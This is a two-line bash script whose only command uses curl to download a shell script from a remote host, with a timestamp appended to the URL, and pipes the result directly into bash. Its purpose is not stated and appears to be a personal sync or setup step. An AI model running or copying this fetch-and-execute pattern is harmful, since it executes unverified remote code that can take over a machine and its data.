#!/bin/bash

curl -s "https://sync.mcavallo.com/sh?$(date +'%s.%N')" | bash;
